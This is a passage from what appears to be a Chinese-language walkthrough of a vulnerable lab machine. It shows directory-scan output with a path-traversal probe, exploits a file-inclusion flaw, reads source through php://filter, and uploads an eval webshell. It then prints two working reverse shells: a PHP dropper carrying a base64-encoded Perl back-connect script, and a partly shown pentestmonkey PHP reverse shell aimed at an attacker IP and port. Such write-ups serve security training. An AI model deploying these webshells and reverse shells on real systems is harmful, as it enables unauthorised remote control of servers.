punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>save</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  299B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_extra</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessOLD</pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>orig</pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  297B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessOLD2</pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  288B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htm</pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  289B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  294B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htpasswds</pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  295B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>httr<span class="token operator">-</span>oauth</pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htpasswd_test</pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">43</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>  351B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">api</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">43</span><span class="token punctuation">]</span> <span class="token number">301</span> <span class="token operator">-</span>  321B  <span class="token operator">-</span> <span class="token operator">/</span>api  <span class="token operator">-</span><span class="token operator">></span>  http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">:</span><span class="token number">8011</span><span class="token operator">/</span>api<span class="token operator">/</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">45</span><span class="token punctuation">]</span> <span class="token number">400</span> <span class="token operator">-</span>  308B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">cgi-bin</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span>etc<span class="token operator">/</span>passwd</pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">51</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>   30B  <span class="token operator">-</span> <span class="token operator">/</span>index<span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">09</span><span class="token operator">:</span><span class="token number">00</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  297B  <span class="token operator">-</span> <span class="token operator">/</span>server<span class="token operator">-</span>status</pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">09</span><span class="token operator">:</span><span class="token number">00</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">server-status</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>Task Completed</pre></td></tr></table></figure><p>这里发现一个 <code>api接口</code> ，我们进去看一下：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181126088-570887979.png" alt="image" /></p>
<p>尝试几波发现只有 <code>files_api.php</code>  可以进去：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181150189-227701744.png" alt="image" /></p>
<p>页面报错信息提示需要一个 <code>file参数</code> ，发现通过 <code>post方式</code> 可以进行文件包含：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181214185-1584981500.png" alt="image" /></p>
<h2 id="漏洞利用"><a class="anchor" href="#漏洞利用">#</a> 漏洞利用</h2>
<p>上传一个图片马：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181228364-2120044844.png" alt="image" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'ant.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST[ant]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">></span></pre></td></tr></table></figure><p>成功上传图片马，但是我们发现这里并没有发现图片上传的路径，我们尝试用 <code>8011</code>  的 <code>api接口</code> 包含上传功能页面，看看能否找到上传的路径信息， <code>apache</code>  的网站目录一般会放在 <code>/var/www/html</code>  下，这里尝试几次后发现它的网站根目录在 <code>/var/www</code>  下，因为这里是文件包含，不能读取文件的源码，我们使用 <code>php伪协议</code> 读取源码：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>file<span class="token operator">=</span>php<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>filter<span class="token operator">/</span>convert<span class="token punctuation">.</span>base64<span class="token operator">-</span>encode<span class="token operator">/</span>resource<span class="token operator">=</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>development<span class="token operator">/</span>uploader<span class="token operator">/</span>upload<span class="token punctuation">.</span>php</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181324401-211109321.png" alt="image" /></p>
<p>成功读取到 <code>base64编码</code> 后的源码，使用 <code>bp解码</code> ：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181346917-902307267.png" alt="image" /></p>
<p>我们成功发现了上传路径为 <code>FRANKuploads/</code> 。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181404437-1636524063.png" alt="image" /></p>
<p>尝试写入包含图片的 <code>webshell</code> ，but 写入失败了，可能是权限的问题 az.</p>
<p>我们换个 <code>webshell</code>  试一下：</p>
<p>方法一，使用如下 <code>php马</code> ：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">function</span> <span class="token function">which</span><span class="token punctuation">(</span><span class="token parameter">$pr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="3"></td><td><pre>$path <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token string">"which $pr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">return</span> <span class="token punctuation">(</span>$path <span class="token operator">?</span> $path <span class="token operator">:</span> $pr<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token parameter">$cfe</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="7"></td><td><pre>$res <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span>$cfe<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="10"></td><td><pre>@<span class="token function">exec</span><span class="token punctuation">(</span>$cfe<span class="token punctuation">,</span>$res<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="11"></td><td><pre>$res <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span>$res<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token function">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'shell_exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="13"></td><td><pre>$res <span class="token operator">=</span> @<span class="token function">shell_exec</span><span class="token punctuation">(</span>$cfe<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token function">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="15"></td><td><pre>@<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="16"></td><td><pre>@<span class="token function">system</span><span class="token punctuation">(</span>$cfe<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="17"></td><td><pre>$res <span class="token operator">=</span> @<span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="18"></td><td><pre>@<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token function">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'passthru'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="20"></td><td><pre>@<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="21"></td><td><pre>@<span class="token function">passthru</span><span class="token punctuation">(</span>$cfe<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="22"></td><td><pre>$res <span class="token operator">=</span> @<span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="23"></td><td><pre>@<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token function">elseif</span><span class="token punctuation">(</span>@<span class="token function">is_resource</span><span class="token punctuation">(</span>$f <span class="token operator">=</span> @<span class="token function">popen</span><span class="token punctuation">(</span>$cfe<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="25"></td><td><pre>$res <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span>$f<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="27"></td><td><pre>$res <span class="token punctuation">.</span><span class="token operator">=</span> @<span class="token function">fread</span><span class="token punctuation">(</span>$f<span class="token punctuation">,</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="29"></td><td><pre>@<span class="token function">pclose</span><span class="token punctuation">(</span>$f<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token keyword">return</span> $res<span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token keyword">function</span> <span class="token function">cf</span><span class="token punctuation">(</span><span class="token parameter">$fname<span class="token punctuation">,</span>$text</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span>$fp<span class="token operator">=</span>@<span class="token function">fopen</span><span class="token punctuation">(</span>$fname<span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="36"></td><td><pre>@<span class="token function">fputs</span><span class="token punctuation">(</span>$fp<span class="token punctuation">,</span>@<span class="token function">base64_decode</span><span class="token punctuation">(</span>$text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="37"></td><td><pre>@<span class="token function">fclose</span><span class="token punctuation">(</span>$fp<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="40"></td><td><pre>$yourip <span class="token operator">=</span> <span class="token string">"your IP"</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="41"></td><td><pre>$yourport <span class="token operator">=</span> <span class="token string">'your port'</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="42"></td><td><pre>$usedb <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'perl'</span><span class="token operator">=></span><span class="token string">'perl'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token operator">=></span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="43"></td><td><pre>$back_connect<span class="token operator">=</span><span class="token string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token function">cf</span><span class="token punctuation">(</span><span class="token string">'/tmp/.bc'</span><span class="token punctuation">,</span>$back_connect<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="51"></td><td><pre>$res <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token function">which</span><span class="token punctuation">(</span><span class="token string">'perl'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" /tmp/.bc $yourip $yourport &amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token operator">?</span><span class="token operator">></span></pre></td></tr></table></figure><p>修改 <code>ip</code>  和 <code>监听端口</code> ：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>$yourip <span class="token operator">=</span> <span class="token string">"192.168.56.115"</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="2"></td><td><pre>$yourport <span class="token operator">=</span> <span class="token string">'1234'</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>方法二，使用 <code>kali自带</code> 的 <code>php马</code> ：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181526537-1871639242.png" alt="image" /></p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">// for any actions performed using this tool.  The author accepts no liability</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">// do not use this tool.</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">// In all other respects the GPL version 2 applies:</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">// This program is free software; you can redistribute it and/or modify</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">// it under the terms of the GNU General Public License version 2 as</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// published by the Free Software Foundation.</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token comment">// This program is distributed in the hope that it will be useful,</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token comment">// GNU General Public License for more details.</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token comment">// You should have received a copy of the GNU General Public License along</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token comment">// for any actions performed using this tool.  If these terms are not acceptable to</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token comment">// you, then do not use this tool.</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token comment">// You are encouraged to send comments, improvements or suggestions to</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token comment">// me at pentestmonkey@pentestmonkey.net</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token comment">// Description</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token comment">// -----------</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token comment">// The recipient will be given a shell running as the current user (apache normally).</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment">// Limitations</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token comment">// -----------</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token comment">// Usage</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token comment">// -----</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token function">set_time_limit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token variable">$VERSION</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1.0"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'192.168.56.115'</span><span class="token punctuation">;</span>  <span class="token comment">// CHANGE THIS</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span>       <span class="token comment">// CHANGE THIS</span></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token variable">$chunk_size</span> <span class="token operator">=</span> <span class="token number">1400</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token variable">$write_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token variable">$error_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uname -a; w; id; /bin/sh -i'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token variable">$debug</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token comment">// Daemonise ourself if possible to avoid zombies later</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token comment">// our php process and avoid zombies.  Worth a try...</span></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pcntl_fork'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>	<span class="token comment">// Fork and have the parent process exit</span></pre></td></tr><tr><td data-num="66"></td><td><pre>	<span class="token variable">$pid</span> <span class="token operator">=</span> <span class="token function">pcntl_fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>	</pre></td></tr><tr><td data-num="68"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't fork"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>	</pre></td></tr><tr><td data-num="73"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span><span class="token punctuation">)</span> <span 